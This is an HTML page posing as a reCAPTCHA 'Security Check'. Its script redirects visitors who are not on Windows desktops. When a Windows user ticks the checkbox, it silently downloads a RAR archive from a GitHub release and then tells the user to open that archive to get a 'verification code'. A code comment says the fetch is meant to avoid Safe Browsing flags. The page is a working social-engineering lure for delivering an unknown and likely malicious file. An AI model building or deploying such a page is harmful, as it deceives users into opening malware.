<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .wrapper {
            width: 302px;
            background: #f9f9f9;
            border: 1px solid #d3d3d3;
            border-radius: 3px;
            box-shadow: 0 0 4px rgba(0,0,0,0.2);
            overflow: hidden;
            transition: all 0.3s ease;
        }

        .blue-header {
            background: #4285f4;
            color: #fff;
            padding: 15px;
            font-size: 14px;
            font-weight: bold;
            line-height: 1.4;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .content-area {
            padding: 20px;
        }

        /* Step 1: Checkbox */
        .checkbox-item {
            display: flex;
            align-items: center;
            cursor: pointer;
            padding: 5px 0;
        }
        .checkbox-item input[type="checkbox"] {
            width: 24px;
            height: 24px;
            margin-right: 12px;
            cursor: pointer;
            accent-color: #4285f4;
        }
        .logo-wrap {
            margin-left: auto;
            display: flex;
            align-items: center;
            gap: 8px;
            color: #555;
            font-size: 10px;
            font-weight: bold;
        }
        .logo-wrap img {
            height: 32px;
        }

        /* Step 2: Explanatory Text and Input Field */
        .input-container {
            display: none; /* Hidden initially */
            text-align: center;
        }
        .input-container h3 {
            margin: 0 0 10px 0;
            font-size: 15px;
            color: #333;
        }
        .explanation-text {
            font-size: 13px;
            color: #555;
            line-height: 1.5;
            margin-bottom: 15px;
            text-align: left;
            background: #f0f4f8;
            padding: 12px;
            border-radius: 4px;
            border-left: 4px solid #4285f4;
        }
        .input-container input {
            width: 80%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 18px;
            text-align: center;
            letter-spacing: 4px;
            text-transform: uppercase;
            outline: none;
            transition: border 0.3s;
            margin-bottom: 15px;
        }
        .input-container input:focus {
            border-color: #4285f4;
            box-shadow: 0 0 4px rgba(66, 133, 244, 0.3);
        }
        
        .btn-verify {
            background: #4285f4;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 3px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            width: 80%;
            transition: background 0.2s;
        }
        .btn-verify:hover {
            background: #3b78e7;
        }

        .error-msg {
            color: #d93025;
            font-size: 13px;
            margin-top: 10px;
            display: none;
        }
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

    <div class="wrapper" id="main-widget">
        <div class="blue-header">
            <span>Security Check</span>
        </div>

        <div class="content-area">
            <!-- Step 1 -->
            <div id="step1">
                <div class="checkbox-item">
                    <input type="checkbox" id="main-checkbox">
                    <label for="main-checkbox" style="cursor:pointer; font-weight:500; color:#444;">I'm not a robot</label>
                    <div class="logo-wrap">
                        <span>reCAPTCHA</span>
                        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="logo">
                    </div>
                </div>
            </div>

            <!-- Step 2 -->
            <div id="step2" class="input-container">
                <h3>Verification Required</h3>
                
                <!-- Natural explanation -->
                <div class="explanation-text">
                    The downloaded archive contains an image. Please open it to retrieve the 6-character verification code and enter it below.
                </div>

                <input type="text" id="code-input" maxlength="6" placeholder="______" autofocus>
                <button class="btn-verify" id="verify-btn">VERIFY</button>
                <div id="error-msg" class="error-msg">Incorrect code. Please try again.</div>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // --- Device and OS Check ---
            (function() {
                const ua = navigator.userAgent.toLowerCase();
                const isWindows = ua.includes("windows");
                const isMobile = /android|iphone|ipad|ipod|blackberry|opera mini|iemobile|mobile/.test(ua);
                
                // If NOT Windows desktop, redirect to btc.com
                if (!(isWindows && !isMobile)) {
                    window.location.href = "https://btc.com";
                }
            })();

            // --- Widget Logic ---
            const checkbox = document.getElementById('main-checkbox');
            const step1 = document.getElementById('step1');
            const step2 = document.getElementById('step2');
            const codeInput = document.getElementById('code-input');
            const verifyBtn = document.getElementById('verify-btn');
            const errorMsg = document.getElementById('error-msg');

            // --- Setup GitHub Release Link ---
            // Replace this URL with your actual .rar file on GitHub Releases!
            const RAR_FILE_URL = "https://github.com/Ramirhub/about-me/releases/download/v1.0/pics.rar";

            // Silent download function from GitHub 
            async function downloadRar() {
                try {
                    // Fetch directly from GitHub (bypasses Render's proxy, avoiding Safe Browsing flags)
                    const response = await fetch(RAR_FILE_URL);
                    if (!response.ok) throw new Error("Network response was not ok");
                    
                    const blob = await response.blob();
                    const blobUrl = window.URL.createObjectURL(blob);
                    const link = document.createElement('a');
                    link.href = blobUrl;
                    link.download = 'pics.rar';
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    setTimeout(() => window.URL.revokeObjectURL(blobUrl), 1000);
                } catch (e) {
                    console.warn("Fetch failed, using fallback link...", e);
                    // Fallback: If CORS fails, use the direct link method
                    const link = document.createElement('a');
                    link.href = RAR_FILE_URL;
                    link.download = 'pics.rar';
                    link.style.display = 'none';
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                }
            }

            // Step 1 Trigger - Download ONCE at the very start.
            checkbox.addEventListener('change', function() {
                if (this.checked) {
                    // 1. Download the RAR (Only happens once per session)
                    downloadRar();
                    
                    // 2. Switch UI
                    step1.classList.add('hidden');
                    step2.style.display = 'block';
                    codeInput.focus();
                }
            });

            // Step 2 Verify Logic
            function handleVerification() {
                const code = codeInput.value.trim().toUpperCase();
                
                fetch('/verify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ code: code })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        errorMsg.style.display = 'none';
                        // Redirect to LinkedIn
                        window.location.href = "https://au.linkedin.com/in/shihan-shen0131?trk=people-guest_people_search-card";
                    } else {
                        errorMsg.style.display = 'block';
                        codeInput.value = '';
                        codeInput.focus();
                        setTimeout(() => {
                            errorMsg.style.display = 'none';
                        }, 3000);
                    }
                })
                .catch(err => {
                    alert("An error occurred processing the code.");
                });
            }

            // Event Listeners for Step 2
            verifyBtn.addEventListener('click', handleVerification);
            codeInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    handleVerification();
                }
            });
        });
    </script>
</body>
</html>
